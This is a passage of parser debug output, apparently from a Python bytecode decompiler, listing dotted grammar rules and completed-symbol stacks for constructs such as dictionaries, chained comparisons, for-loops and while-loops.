compare_chained1 ::= expr . DUP_TOP ROT_THREE COMPARE_OP JUMP_IF_FALSE_OR_POP compare_chained1 COME_FROM
compare_chained1 ::= expr . DUP_TOP ROT_THREE COMPARE_OP JUMP_IF_FALSE_OR_POP compare_chained2 COME_FROM
compare_chained1_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2b_false_37 POP_TOP _jump COME_FROM
compare_chained1_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2c_37 POP_TOP JUMP_FORWARD COME_FROM
compare_chained1a_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE
compare_chained1a_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_37 COME_FROM POP_TOP COME_FROM
compare_chained1b_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2b_false_37 POP_TOP _jump COME_FROM
compare_chained1c_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_37 POP_TOP
compare_chained2_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_false_37 POP_TOP JUMP_BACK COME_FROM
compare_chained37 ::= expr . compare_chained1a_37
compare_chained37 ::= expr . compare_chained1c_37
compare_chained37_false ::= expr . compare_chained1_false_37
compare_chained37_false ::= expr . compare_chained1b_false_37
compare_chained37_false ::= expr . compare_chained2_false_37
compare_single ::= expr . expr COMPARE_OP
compare_single ::= expr expr . COMPARE_OP
const_list ::= COLLECTION_START . add_consts BUILD_CONST_DICT
const_list ::= COLLECTION_START \e_add_consts . BUILD_CONST_DICT
const_list ::= COLLECTION_START add_consts . BUILD_CONST_DICT
const_list ::= COLLECTION_START add_consts BUILD_CONST_DICT . 
continues ::= _stmts . lastl_stmt continue
dict ::= const_list . 
dict ::= expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_2
dict ::= expr . expr expr LOAD_CONST BUILD_CONST_KEY_MAP_3
dict ::= expr . expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_4
dict ::= expr . expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr . expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr . expr expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr . expr expr expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr . LOAD_CONST BUILD_CONST_KEY_MAP_2
dict ::= expr expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_3
dict ::= expr expr . expr expr LOAD_CONST BUILD_CONST_KEY_MAP_4
dict ::= expr expr . expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr . expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr expr . expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr . expr expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr LOAD_CONST . BUILD_CONST_KEY_MAP_2
dict ::= expr expr expr . LOAD_CONST BUILD_CONST_KEY_MAP_3
dict ::= expr expr expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_4
dict ::= expr expr expr . expr expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr expr . expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr expr expr . expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr . expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr LOAD_CONST . BUILD_CONST_KEY_MAP_3
dict ::= expr expr expr expr . LOAD_CONST BUILD_CONST_KEY_MAP_4
dict ::= expr expr expr expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr expr expr . expr expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr expr expr expr . expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr . expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr expr LOAD_CONST . BUILD_CONST_KEY_MAP_4
dict ::= expr expr expr expr expr . LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr expr expr expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr expr expr expr expr . expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr expr expr . expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= kvlist_0 . 
expr ::= LOAD_CONST . 
expr ::= LOAD_FAST . 
expr ::= LOAD_GLOBAL . 
expr ::= LOAD_STR . 
expr ::= attribute . 
expr ::= attribute37 . 
expr ::= call . 
expr ::= call_kw36 . 
expr ::= dict . 
expr ::= formatted_value1 . 
expr ::= formatted_value_debug . 
expr ::= joined_str . 
expr_jit ::= expr . JUMP_IF_TRUE
expr_jitop ::= expr . JUMP_IF_TRUE_OR_POP
expr_jt ::= expr . jmp_true
expr_pjit ::= expr . POP_JUMP_IF_TRUE
expr_pjit_come_from ::= expr . POP_JUMP_IF_TRUE COME_FROM
expr_stmt ::= expr . POP_TOP
expr_stmt ::= expr POP_TOP . 
for38 ::= expr . get_for_iter store for_block
for38 ::= expr . get_for_iter store for_block JUMP_BACK
for38 ::= expr . get_for_iter store for_block JUMP_BACK POP_BLOCK
for38 ::= expr . get_iter store for_block JUMP_BACK
forelselaststmt38 ::= expr . get_for_iter store for_block POP_BLOCK else_suitec
forelselaststmtl38 ::= expr . get_for_iter store for_block POP_BLOCK else_suitel
forelsestmt38 ::= expr . get_for_iter store for_block JUMP_BACK \e__come_froms else_suite
forelsestmt38 ::= expr . get_for_iter store for_block JUMP_BACK _come_froms else_suite
forelsestmt38 ::= expr . get_for_iter store for_block POP_BLOCK else_suite
formatted_value1 ::= expr . FORMAT_VALUE
formatted_value1 ::= expr FORMAT_VALUE . 
formatted_value_debug ::= LOAD_STR . formatted_value1 BUILD_STRING_2
formatted_value_debug ::= LOAD_STR . formatted_value1 LOAD_STR BUILD_STRING_3
formatted_value_debug ::= LOAD_STR . formatted_value2 BUILD_STRING_2
formatted_value_debug ::= LOAD_STR . formatted_value2 LOAD_STR BUILD_STRING_3
formatted_value_debug ::= LOAD_STR formatted_value1 . BUILD_STRING_2
formatted_value_debug ::= LOAD_STR formatted_value1 . LOAD_STR BUILD_STRING_3
formatted_value_debug ::= LOAD_STR formatted_value1 LOAD_STR . BUILD_STRING_3
formatted_value_debug ::= LOAD_STR formatted_value1 LOAD_STR BUILD_STRING_3 . 
get_iter ::= expr . GET_ITER
if_exp ::= expr . jmp_false expr jf_cf expr COME_FROM
if_exp ::= expr . jmp_false expr jump_absolute_else expr
if_exp37 ::= expr . expr jf_cfs expr COME_FROM
if_exp37 ::= expr expr . jf_cfs expr COME_FROM
if_exp_37b ::= expr . jmp_false expr POP_JUMP_IF_FALSE jump_forward_else expr
if_exp_lambda ::= expr . jmp_false expr return_if_lambda return_stmt_lambda LAMBDA_MARKER
if_exp_not ::= expr . jmp_true expr jump_forward_else expr COME_FROM
if_exp_not_lambda ::= expr . jmp_true expr return_if_lambda return_stmt_lambda LAMBDA_MARKER
if_exp_true ::= expr . JUMP_FORWARD expr COME_FROM
joined_str ::= expr . expr BUILD_STRING_2
joined_str ::= expr . expr expr BUILD_STRING_3
joined_str ::= expr expr . BUILD_STRING_2
joined_str ::= expr expr . expr BUILD_STRING_3
joined_str ::= expr expr expr . BUILD_STRING_3
joined_str ::= expr expr expr BUILD_STRING_3 . 
kvlist_0 ::= BUILD_MAP_0 . 
kvlist_1 ::= expr . expr BUILD_MAP_1
kvlist_1 ::= expr expr . BUILD_MAP_1
l_stmts ::= _stmts . 
l_stmts ::= _stmts . lastl_stmt
l_stmts ::= l_stmts . lstmt
l_stmts ::= lstmt . 
lambda_body ::= expr . LOAD_LAMBDA LOAD_STR MAKE_FUNCTION_4
lstmt ::= stmt . 
mkfunc ::= expr . LOAD_CODE LOAD_STR MAKE_FUNCTION_4
mkfuncdeco ::= expr . mkfuncdeco CALL_FUNCTION_1
mkfuncdeco ::= expr . mkfuncdeco0 CALL_FUNCTION_1
named_expr ::= expr . DUP_TOP store
pop_ex_return ::= return_expr . ROT_FOUR POP_EXCEPT RETURN_VALUE
popb_return ::= return_expr . POP_BLOCK RETURN_VALUE
pos_arg ::= expr . 
ret_and ::= expr . JUMP_IF_FALSE_OR_POP return_expr_or_cond COME_FROM
ret_or ::= expr . JUMP_IF_TRUE_OR_POP return_expr_or_cond COME_FROM
return ::= return_expr . RETURN_END_IF
return ::= return_expr . RETURN_VALUE
return ::= return_expr . RETURN_VALUE COME_FROM
return ::= return_expr . discard_tops RETURN_VALUE
return_expr ::= expr . 
return_expr_lambda ::= return_expr . RETURN_VALUE_LAMBDA
return_expr_lambda ::= return_expr . RETURN_VALUE_LAMBDA LAMBDA_MARKER
returns ::= _stmts . return
returns ::= _stmts . return_if_stmt
sstmt ::= sstmt . RETURN_LAST
sstmt ::= stmt . 
stmt ::= call_stmt . 
stmt ::= expr_stmt . 
stmts ::= sstmt . 
stmts ::= stmts . sstmt
store ::= expr . STORE_ATTR
store_subscript ::= expr . expr STORE_SUBSCR
store_subscript ::= expr expr . STORE_SUBSCR
subscript ::= expr . expr BINARY_SUBSCR
subscript ::= expr expr . BINARY_SUBSCR
subscript2 ::= expr . expr DUP_TOP_TWO BINARY_SUBSCR
subscript2 ::= expr expr . DUP_TOP_TWO BINARY_SUBSCR
testfalse ::= expr . jmp_false
testfalse_not_and ::= expr . jmp_false expr jmp_true COME_FROM
testfalse_not_or ::= expr . jmp_false expr jmp_false COME_FROM
testfalsel ::= expr . jmp_true
testtrue ::= expr . jmp_true
tuple ::= expr . expr BUILD_TUPLE_2
tuple ::= expr expr . BUILD_TUPLE_2
unary_not ::= expr . UNARY_NOT
unary_op ::= expr . unary_operator
while1stmt ::= \e__come_froms . l_stmts COME_FROM JUMP_BACK COME_FROM_LOOP
while1stmt ::= \e__come_froms l_stmts . COME_FROM JUMP_BACK COME_FROM_LOOP
whileTruestmt ::= \e__come_froms . l_stmts JUMP_BACK POP_BLOCK
whileTruestmt ::= \e__come_froms l_stmts . JUMP_BACK POP_BLOCK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK COME_FROM_EXCEPT_CLAUSE
whileTruestmt38 ::= \e__come_froms . pass JUMP_BACK
whileTruestmt38 ::= \e__come_froms \e_pass . JUMP_BACK
whileTruestmt38 ::= \e__come_froms l_stmts . JUMP_BACK
whileTruestmt38 ::= \e__come_froms l_stmts . JUMP_BACK COME_FROM_EXCEPT_CLAUSE
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts JUMP_BACK
whilestmt38 ::= \e__come_froms . testexpr l_stmts come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr returns POP_BLOCK
yield ::= expr . YIELD_VALUE
yield_from ::= expr . GET_YIELD_FROM_ITER LOAD_CONST YIELD_FROM

-- Stacks of completed symbols:
START ::= |- stmts . 
_come_froms ::= \e__come_froms . COME_FROM
_come_froms ::= \e__come_froms . COME_FROM_LOOP
_stmts ::= _stmts . stmt
_stmts ::= _stmts stmt . 
_stmts ::= stmt . 
and ::= expr . JUMP_IF_FALSE_OR_POP expr \e_come_from_opt
and ::= expr . JUMP_IF_FALSE_OR_POP expr come_from_opt
and ::= expr . jifop_come_from expr
and ::= expr . jmp_false expr
and ::= expr . jmp_false expr COME_FROM
and ::= expr . jmp_false expr jmp_false
and_not ::= expr . jmp_false expr POP_JUMP_IF_TRUE
assert2 ::= expr . jmp_true LOAD_GLOBAL expr CALL_FUNCTION_1 RAISE_VARARGS_1
assign ::= expr . DUP_TOP designList
assign ::= expr . store
assign2 ::= expr . expr ROT_TWO store store
assign2 ::= expr expr . ROT_TWO store store
assign3 ::= expr . expr expr ROT_THREE ROT_TWO store store store
assign3 ::= expr expr . expr ROT_THREE ROT_TWO store store store
assign3 ::= expr expr expr . ROT_THREE ROT_TWO store store store
async_for_stmt38 ::= expr . async_for store for_block COME_FROM_FINALLY END_ASYNC_FOR
async_forelse_stmt38 ::= expr . GET_AITER SETUP_FINALLY GET_ANEXT LOAD_CONST YIELD_FROM POP_BLOCK store for_block COME_FROM_FINALLY END_ASYNC_FOR else_suite
attribute ::= expr . LOAD_ATTR
attribute37 ::= expr . LOAD_METHOD
attribute37 ::= expr LOAD_METHOD . 
aug_assign1 ::= expr . expr inplace_op ROT_THREE STORE_SUBSCR
aug_assign1 ::= expr . expr inplace_op store
aug_assign1 ::= expr expr . inplace_op ROT_THREE STORE_SUBSCR
aug_assign1 ::= expr expr . inplace_op store
aug_assign2 ::= expr . DUP_TOP LOAD_ATTR expr inplace_op ROT_TWO STORE_ATTR
await_expr ::= expr . GET_AWAITABLE LOAD_CONST YIELD_FROM
bin_op ::= expr . expr binary_operator
bin_op ::= expr expr . binary_operator
break ::= POP_TOP . BREAK_LOOP
call ::= expr . CALL_FUNCTION_0
call ::= expr . CALL_METHOD_0
call ::= expr . expr CALL_METHOD_1
call ::= expr . expr expr CALL_METHOD_2
call ::= expr . pos_arg CALL_FUNCTION_1
call ::= expr . pos_arg pos_arg CALL_FUNCTION_2
call ::= expr expr . CALL_METHOD_1
call ::= expr expr . expr CALL_METHOD_2
call ::= expr expr expr . CALL_METHOD_2
call ::= expr expr expr CALL_METHOD_2 . 
call ::= expr pos_arg . CALL_FUNCTION_1
call ::= expr pos_arg . pos_arg CALL_FUNCTION_2
call ::= expr pos_arg CALL_FUNCTION_1 . 
call ::= expr pos_arg pos_arg . CALL_FUNCTION_2
call_kw36 ::= expr . expr LOAD_CONST CALL_FUNCTION_KW_1
call_kw36 ::= expr . expr expr LOAD_CONST CALL_FUNCTION_KW_2
call_kw36 ::= expr . expr expr expr LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr . LOAD_CONST CALL_FUNCTION_KW_1
call_kw36 ::= expr expr . expr LOAD_CONST CALL_FUNCTION_KW_2
call_kw36 ::= expr expr . expr expr LOAD_CONST CALL_FUNCTION_KW_3
call_kw36 ::= expr expr expr . LOAD_CONST CALL_FUNCTION_KW_2
call_kw36 ::= expr expr expr . expr LOAD_CONST CALL_FUNCTION_KW_3
call_stmt ::= call . 
call_stmt ::= expr . POP_TOP
call_stmt ::= expr POP_TOP . 
classdefdeco1 ::= expr . classdefdeco1 CALL_FUNCTION_1
classdefdeco1 ::= expr . classdefdeco2 CALL_FUNCTION_1
come_from_loops ::= \e_come_from_loops . COME_FROM_LOOP
compare_chained ::= expr . compare_chained1 ROT_TWO POP_TOP \e__come_froms
compare_chained ::= expr . compare_chained1 ROT_TWO POP_TOP _come_froms
compare_chained1 ::= expr . DUP_TOP ROT_THREE COMPARE_OP JUMP_IF_FALSE_OR_POP compare_chained1 COME_FROM
compare_chained1 ::= expr . DUP_TOP ROT_THREE COMPARE_OP JUMP_IF_FALSE_OR_POP compare_chained2 COME_FROM
compare_chained1_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2b_false_37 POP_TOP _jump COME_FROM
compare_chained1_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2c_37 POP_TOP JUMP_FORWARD COME_FROM
compare_chained1a_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE
compare_chained1a_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_37 COME_FROM POP_TOP COME_FROM
compare_chained1b_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2b_false_37 POP_TOP _jump COME_FROM
compare_chained1c_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_37 POP_TOP
compare_chained2_false_37 ::= expr . DUP_TOP ROT_THREE COMPARE_OP POP_JUMP_IF_FALSE compare_chained2a_false_37 POP_TOP JUMP_BACK COME_FROM
compare_chained37 ::= expr . compare_chained1a_37
compare_chained37 ::= expr . compare_chained1c_37
compare_chained37_false ::= expr . compare_chained1_false_37
compare_chained37_false ::= expr . compare_chained1b_false_37
compare_chained37_false ::= expr . compare_chained2_false_37
compare_single ::= expr . expr COMPARE_OP
compare_single ::= expr expr . COMPARE_OP
continues ::= _stmts . lastl_stmt continue
dict ::= expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_2
dict ::= expr . expr expr LOAD_CONST BUILD_CONST_KEY_MAP_3
dict ::= expr . expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_4
dict ::= expr . expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr . expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr . expr expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr . expr expr expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr . LOAD_CONST BUILD_CONST_KEY_MAP_2
dict ::= expr expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_3
dict ::= expr expr . expr expr LOAD_CONST BUILD_CONST_KEY_MAP_4
dict ::= expr expr . expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr . expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr expr . expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr . expr expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
dict ::= expr expr expr . LOAD_CONST BUILD_CONST_KEY_MAP_3
dict ::= expr expr expr . expr LOAD_CONST BUILD_CONST_KEY_MAP_4
dict ::= expr expr expr . expr expr LOAD_CONST BUILD_CONST_KEY_MAP_5
dict ::= expr expr expr . expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_6
dict ::= expr expr expr . expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_14
dict ::= expr expr expr . expr expr expr expr expr expr expr expr expr expr expr expr LOAD_CONST BUILD_CONST_KEY_MAP_15
expr ::= LOAD_CONST . 
expr ::= LOAD_FAST . 
expr ::= LOAD_GLOBAL . 
expr ::= attribute37 . 
expr ::= call . 
expr ::= get_iter . 
expr_jit ::= expr . JUMP_IF_TRUE
expr_jitop ::= expr . JUMP_IF_TRUE_OR_POP
expr_jt ::= expr . jmp_true
expr_pjit ::= expr . POP_JUMP_IF_TRUE
expr_pjit_come_from ::= expr . POP_JUMP_IF_TRUE COME_FROM
expr_stmt ::= expr . POP_TOP
expr_stmt ::= expr POP_TOP . 
for38 ::= expr . get_for_iter store for_block
for38 ::= expr . get_for_iter store for_block JUMP_BACK
for38 ::= expr . get_for_iter store for_block JUMP_BACK POP_BLOCK
for38 ::= expr . get_iter store for_block JUMP_BACK
for38 ::= expr get_for_iter . store for_block
for38 ::= expr get_for_iter . store for_block JUMP_BACK
for38 ::= expr get_for_iter . store for_block JUMP_BACK POP_BLOCK
for38 ::= expr get_for_iter store . for_block
for38 ::= expr get_for_iter store . for_block JUMP_BACK
for38 ::= expr get_for_iter store . for_block JUMP_BACK POP_BLOCK
for38 ::= expr get_for_iter store for_block . 
for38 ::= expr get_for_iter store for_block . JUMP_BACK
for38 ::= expr get_for_iter store for_block . JUMP_BACK POP_BLOCK
for38 ::= expr get_for_iter store for_block JUMP_BACK . 
for38 ::= expr get_for_iter store for_block JUMP_BACK . POP_BLOCK
for_block ::= \e__come_froms . l_stmts_opt _come_from_loops JUMP_BACK
for_block ::= \e__come_froms \e_l_stmts_opt . _come_from_loops JUMP_BACK
for_block ::= \e__come_froms l_stmts_opt . _come_from_loops JUMP_BACK
for_block ::= \e_l_stmts_opt . _come_froms JUMP_BACK
for_block ::= \e_l_stmts_opt . come_from_loops JUMP_BACK
for_block ::= \e_l_stmts_opt \e__come_froms . JUMP_BACK
for_block ::= \e_l_stmts_opt \e_come_from_loops . JUMP_BACK
for_block ::= l_stmts . 
for_block ::= l_stmts . JUMP_BACK
for_block ::= l_stmts JUMP_BACK . 
for_block ::= l_stmts_opt . _come_froms JUMP_BACK
for_block ::= l_stmts_opt . come_from_loops JUMP_BACK
for_block ::= l_stmts_opt \e__come_froms . JUMP_BACK
for_block ::= l_stmts_opt \e__come_froms JUMP_BACK . 
for_block ::= l_stmts_opt \e_come_from_loops . JUMP_BACK
for_block ::= l_stmts_opt \e_come_from_loops JUMP_BACK . 
forelselaststmt38 ::= expr . get_for_iter store for_block POP_BLOCK else_suitec
forelselaststmt38 ::= expr get_for_iter . store for_block POP_BLOCK else_suitec
forelselaststmt38 ::= expr get_for_iter store . for_block POP_BLOCK else_suitec
forelselaststmt38 ::= expr get_for_iter store for_block . POP_BLOCK else_suitec
forelselaststmtl38 ::= expr . get_for_iter store for_block POP_BLOCK else_suitel
forelselaststmtl38 ::= expr get_for_iter . store for_block POP_BLOCK else_suitel
forelselaststmtl38 ::= expr get_for_iter store . for_block POP_BLOCK else_suitel
forelselaststmtl38 ::= expr get_for_iter store for_block . POP_BLOCK else_suitel
forelsestmt38 ::= expr . get_for_iter store for_block JUMP_BACK \e__come_froms else_suite
forelsestmt38 ::= expr . get_for_iter store for_block JUMP_BACK _come_froms else_suite
forelsestmt38 ::= expr . get_for_iter store for_block POP_BLOCK else_suite
forelsestmt38 ::= expr get_for_iter . store for_block JUMP_BACK \e__come_froms else_suite
forelsestmt38 ::= expr get_for_iter . store for_block JUMP_BACK _come_froms else_suite
forelsestmt38 ::= expr get_for_iter . store for_block POP_BLOCK else_suite
forelsestmt38 ::= expr get_for_iter store . for_block JUMP_BACK \e__come_froms else_suite
forelsestmt38 ::= expr get_for_iter store . for_block JUMP_BACK _come_froms else_suite
forelsestmt38 ::= expr get_for_iter store . for_block POP_BLOCK else_suite
forelsestmt38 ::= expr get_for_iter store for_block . JUMP_BACK \e__come_froms else_suite
forelsestmt38 ::= expr get_for_iter store for_block . JUMP_BACK _come_froms else_suite
forelsestmt38 ::= expr get_for_iter store for_block . POP_BLOCK else_suite
forelsestmt38 ::= expr get_for_iter store for_block JUMP_BACK . _come_froms else_suite
forelsestmt38 ::= expr get_for_iter store for_block JUMP_BACK \e__come_froms . else_suite
formatted_value1 ::= expr . FORMAT_VALUE
get_for_iter ::= GET_ITER . _come_froms FOR_ITER
get_for_iter ::= GET_ITER \e__come_froms . FOR_ITER
get_for_iter ::= GET_ITER \e__come_froms FOR_ITER . 
get_iter ::= expr . GET_ITER
get_iter ::= expr GET_ITER . 
if_exp ::= expr . jmp_false expr jf_cf expr COME_FROM
if_exp ::= expr . jmp_false expr jump_absolute_else expr
if_exp37 ::= expr . expr jf_cfs expr COME_FROM
if_exp37 ::= expr expr . jf_cfs expr COME_FROM
if_exp_37b ::= expr . jmp_false expr POP_JUMP_IF_FALSE jump_forward_else expr
if_exp_lambda ::= expr . jmp_false expr return_if_lambda return_stmt_lambda LAMBDA_MARKER
if_exp_not ::= expr . jmp_true expr jump_forward_else expr COME_FROM
if_exp_not_lambda ::= expr . jmp_true expr return_if_lambda return_stmt_lambda LAMBDA_MARKER
if_exp_true ::= expr . JUMP_FORWARD expr COME_FROM
joined_str ::= expr . expr BUILD_STRING_2
joined_str ::= expr . expr expr BUILD_STRING_3
joined_str ::= expr expr . BUILD_STRING_2
joined_str ::= expr expr . expr BUILD_STRING_3
joined_str ::= expr expr expr . BUILD_STRING_3
kvlist_1 ::= expr . expr BUILD_MAP_1
kvlist_1 ::= expr expr . BUILD_MAP_1
l_stmts ::= _stmts . 
l_stmts ::= _stmts . lastl_stmt
l_stmts ::= l_stmts . lstmt
l_stmts ::= l_stmts lstmt . 
l_stmts ::= lstmt . 
l_stmts_opt ::= l_stmts . 
lambda_body ::= expr . LOAD_LAMBDA LOAD_STR MAKE_FUNCTION_4
lstmt ::= stmt . 
mkfunc ::= expr . LOAD_CODE LOAD_STR MAKE_FUNCTION_4
mkfuncdeco ::= expr . mkfuncdeco CALL_FUNCTION_1
mkfuncdeco ::= expr . mkfuncdeco0 CALL_FUNCTION_1
named_expr ::= expr . DUP_TOP store
pop_ex_return ::= return_expr . ROT_FOUR POP_EXCEPT RETURN_VALUE
pop_return ::= POP_TOP . return_expr RETURN_VALUE
pop_return ::= POP_TOP return_expr . RETURN_VALUE
popb_return ::= return_expr . POP_BLOCK RETURN_VALUE
pos_arg ::= expr . 
ret_and ::= expr . JUMP_IF_FALSE_OR_POP return_expr_or_cond COME_FROM
ret_or ::= expr . JUMP_IF_TRUE_OR_POP return_expr_or_cond COME_FROM
return ::= return_expr . RETURN_END_IF
return ::= return_expr . RETURN_VALUE
return ::= return_expr . RETURN_VALUE COME_FROM
return ::= return_expr . discard_tops RETURN_VALUE
return_expr ::= expr . 
return_expr_lambda ::= return_expr . RETURN_VALUE_LAMBDA
return_expr_lambda ::= return_expr . RETURN_VALUE_LAMBDA LAMBDA_MARKER
return_if_stmt ::= return_expr . RETURN_END_IF
return_if_stmt ::= return_expr . RETURN_END_IF POP_BLOCK
returns ::= _stmts . return
returns ::= _stmts . return_if_stmt
sstmt ::= sstmt . RETURN_LAST
sstmt ::= stmt . 
stmt ::= call_stmt . 
stmt ::= expr_stmt . 
stmt ::= for38 . 
stmts ::= sstmt . 
stmts ::= stmts . sstmt
stmts ::= stmts sstmt . 
store ::= STORE_FAST . 
store ::= expr . STORE_ATTR
store_subscript ::= expr . expr STORE_SUBSCR
store_subscript ::= expr expr . STORE_SUBSCR
subscript ::= expr . expr BINARY_SUBSCR
subscript ::= expr expr . BINARY_SUBSCR
subscript2 ::= expr . expr DUP_TOP_TWO BINARY_SUBSCR
subscript2 ::= expr expr . DUP_TOP_TWO BINARY_SUBSCR
testfalse ::= expr . jmp_false
testfalse_not_and ::= expr . jmp_false expr jmp_true COME_FROM
testfalse_not_or ::= expr . jmp_false expr jmp_false COME_FROM
testfalsel ::= expr . jmp_true
testtrue ::= expr . jmp_true
tuple ::= expr . expr BUILD_TUPLE_2
tuple ::= expr expr . BUILD_TUPLE_2
unary_not ::= expr . UNARY_NOT
unary_op ::= expr . unary_operator
while1stmt ::= \e__come_froms . l_stmts COME_FROM JUMP_BACK COME_FROM_LOOP
while1stmt ::= \e__come_froms l_stmts . COME_FROM JUMP_BACK COME_FROM_LOOP
whileTruestmt ::= \e__come_froms . l_stmts JUMP_BACK POP_BLOCK
whileTruestmt ::= \e__come_froms l_stmts . JUMP_BACK POP_BLOCK
whileTruestmt ::= \e__come_froms l_stmts JUMP_BACK . POP_BLOCK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK
whileTruestmt38 ::= \e__come_froms . l_stmts JUMP_BACK COME_FROM_EXCEPT_CLAUSE
whileTruestmt38 ::= \e__come_froms . pass JUMP_BACK
whileTruestmt38 ::= \e__come_froms \e_pass . JUMP_BACK
whileTruestmt38 ::= \e__come_froms \e_pass JUMP_BACK . 
whileTruestmt38 ::= \e__come_froms l_stmts . JUMP_BACK
whileTruestmt38 ::= \e__come_froms l_stmts . JUMP_BACK COME_FROM_EXCEPT_CLAUSE
whileTruestmt38 ::= \e__come_froms l_stmts JUMP_BACK . 
whileTruestmt38 ::= \e__come_froms l_stmts JUMP_BACK . COME_FROM_EXCEPT_CLAUSE
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr \e_l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts JUMP_BACK
whilestmt38 ::= \e__come_froms . testexpr l_stmts come_froms
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt COME_FROM JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK POP_BLOCK
whilestmt38 ::= \e__come_froms . testexpr l_stmts_opt JUMP_BACK come_froms
whilestmt38 ::= \e__come_froms . testexpr returns POP_BLOCK
yield ::= expr . YIELD_VALUE
yield_from ::= expr . GET_YIELD_FROM_ITER LOAD_CONST YIELD_FROM

-- Stacks of completed symbols:
START ::= |- stmts . 
_come_froms ::= \e__come_froms . COME_FROM
_come_froms ::= \e__come_froms . COME_FROM_LOOP
